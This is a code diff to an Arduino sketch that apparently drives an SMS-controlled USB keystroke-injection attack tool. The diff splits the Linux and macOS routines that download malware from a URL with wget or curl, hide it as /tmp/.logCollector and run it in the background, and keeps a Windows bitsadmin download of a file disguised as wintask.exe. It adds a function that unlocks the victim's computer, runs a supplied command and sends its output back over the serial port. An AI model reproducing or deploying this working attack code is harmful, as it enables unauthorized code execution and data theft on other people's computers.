@@ -23,13 +23,13 @@ void unlockDownload(String SMS_text){
   }
   else if(OS == "lnx"){
     openTerminalLinux();
-    downloadAndRunMalwareLinuxMacOs(url);
+    downloadAndRunMalwareLinux(url);
     exitTerminalWindowsLinux();
     lockWindowsLinux();
   }
   else if(OS == "osx"){
     openTerminalMacOs();
-    downloadAndRunMalwareLinuxMacOs(url);
+    downloadAndRunMalwareMacOs(url);
     exitTerminalMultiOs();
     lockMacOs();
   }
@@ -38,7 +38,8 @@ void unlockDownload(String SMS_text){
     openTerminalWindowsLinux();
     // If it's not windows it will fail, but it would be logged in the history
     downloadAndRunMalwareWindows(url);
-    downloadAndRunMalwareLinuxMacOs(url);
+    downloadAndRunMalwareLinux(url);
+    downloadAndRunMalwareMacOs(url);
     exitTerminalWindowsLinux();
     lockWindowsLinux();
   }
@@ -47,7 +48,8 @@ void unlockDownload(String SMS_text){
     openTerminalMultiOs();
     //We try all the payloads
     downloadAndRunMalwareWindows(url);
-    downloadAndRunMalwareLinuxMacOs(url);
+    downloadAndRunMalwareLinux(url);
+    downloadAndRunMalwareMacOs(url);
     //It also closes it for Windows and Linux
     exitTerminalMultiOs();
     //We try to lock all the os
@@ -59,6 +61,62 @@ void unlockDownload(String SMS_text){
   }
 }
 
+
+void unlockRunAndExfil(String SMS_text) {
+  String OS = getValue(SMS_text,SEPARATOR,1);
+  OS.toLowerCase();
+  String password = getValue(SMS_text,SEPARATOR,2);
+  String command = getValue(SMS_text,SEPARATOR,3);
+  // Unlock the computer to download and execute malware
+  unlockComputer(password);
+  
+  // Download and execute the malware
+  if(OS == "win"){
+    //Open a terminal with UAC elevated if possible
+    openTerminalWindows();
+    runAndExfilWindows(command);
+    exitTerminalWindowsLinux();
+    lockWindowsLinux();
+  }
+  else if(OS == "lnx"){
+    openTerminalLinux();
+    runAndExfilLinux(command);
+    exitTerminalWindowsLinux();
+    lockWindowsLinux();
+  }
+  else if(OS == "osx"){
+    openTerminalMacOs();
+    runAndExfilMacOs(command);
+    exitTerminalMultiOs();
+    lockMacOs();
+  }
+  else if(OS == "winlin"){
+    //We don't know the OS but we suspect is windows or linux
+    openTerminalWindowsLinux();
+    // If it's not windows it will fail, but it would be logged in the history
+    runAndExfilWindows(command);
+    runAndExfilLinux(command);
+    runAndExfilMacOs(command);
+    exitTerminalWindowsLinux();
+    lockWindowsLinux();
+  }
+  else if(OS == "multi"){
+    //We don't know the OS
+    openTerminalMultiOs();
+    //We try all the payloads
+    runAndExfilWindows(command);
+    runAndExfilLinux(command);
+    runAndExfilMacOs(command);
+    //It also closes it for Windows and Linux
+    exitTerminalMultiOs();
+    //We try to lock all the os
+    lockWindowsLinux();
+    lockMacOs();
+  }
+  else {
+    sendSMSMessage("Wrong OS sent for payload");
+  }
+}
 
 // Manuall##press##83 72 (in hex)
 // Manual##delay##100
@@ -418,15 +476,29 @@ void downloadAndRunMalwareWindows(String url){
 
   Keyboard.print("bitsadmin /transfer winupdate /download /priority foreground ");
   Keyboard.print(url);
-  Keyboard.println(" %appdata%\\Microsoft\\wintask.exe && start \"\" %appdata%\\Microsoft\\wintask.exe && exit");
+  Keyboard.println(" %appdata%\\Microsoft\\wintask.exe && start \"\" %appdata%\\Microsoft\\wintask.exe");
   Keyboard.releaseAll();
   delay(2000);        
 }
 
-void downloadAndRunMalwareLinuxMacOs(String url){
-  Keyboard.print(" x=/tmp/.logCollector; wget --no-check-certificate ");
+// By default ubuntu has wget but not curl
+// Tested it in bash, zsh and fish shells
+// disown is important for zsh, if not zsh doesn't exit after exit because of a pending job
+void downloadAndRunMalwareLinux(String url){
+  Keyboard.print(" export x=/tmp/.logCollector && wget --no-check-certificate ");
   Keyboard.print(url);
-  Keyboard.println(" -O ${x}; chmod +x ${x}; nohup ${x} &");
+  Keyboard.println(" -O $x && chmod +x $x && nohup $x & disown");
+  Keyboard.releaseAll();
+  delay(1000);
+}
+
+// By default MacOs has curl but not wget
+// Tested it in bash, zsh and fish shells
+// disown is important for zsh, if not zsh doesn't exit after exit because of a pending job
+void downloadAndRunMalwareMacOs(String url){
+  Keyboard.print(" export x=/tmp/.logCollector && curl -k ");
+  Keyboard.print(url);
+  Keyboard.println(" -o $x && chmod +x $x && nohup $x & disown");
   Keyboard.releaseAll();
   delay(1000); 
 }
@@ -475,4 +547,30 @@ void lockMacOs(){
   Keyboard.press('q');
   Keyboard.releaseAll();
   delay(1000);
+}
+
+//These strings use a lot of the memory so we use PROGMEM to store it in the code area
+const char powershell_command_1[] PROGMEM = " powershell -Command \"$s=(Get-WmiObject -Class Win32_PnPEntity -Namespace \\\"root\\CIMV2\\\" -Filter \\\"PNPDeviceID like 'USB\\\\VID_2341^&PID_8036%'\\\").Caption; $com=[regex]::match($s,'\\(([^\\)]+)\\)').Groups[1].Value; $cmd=";
+const char powershell_command_2[] PROGMEM = "; $port= new-Object System.IO.Ports.SerialPort $com,38400,None,8,one; $port.open(); $port.WriteLine(\\\"$cmd\\\"); $port.Close();";
+
+void runAndExfilWindows(String command) {
+  Keyboard.print(powershell_command_1);
+  // We avoid concatenation to avoid dynamic memory usage
+  Keyboard.print(command);
+  Keyboard.println(powershell_command_2);
+  delay(3000);  
+}
+
+void runAndExfilLinux(String command) {
+  Keyboard.print(" stty -F /dev/serial/by-id/*Arduino* 38400 && ");
+  Keyboard.print(command);
+  Keyboard.println(" > /dev/serial/by-id/*Arduino* ");
+  delay(3000);  
+}
+
+void runAndExfilMacOs(String command) {
+  Keyboard.print(" stty -f /dev/cu.usbmodem* 38400 && ");
+  Keyboard.print(command);
+  Keyboard.println(" > /dev/cu.usbmodem*");
+  delay(3000);
 }
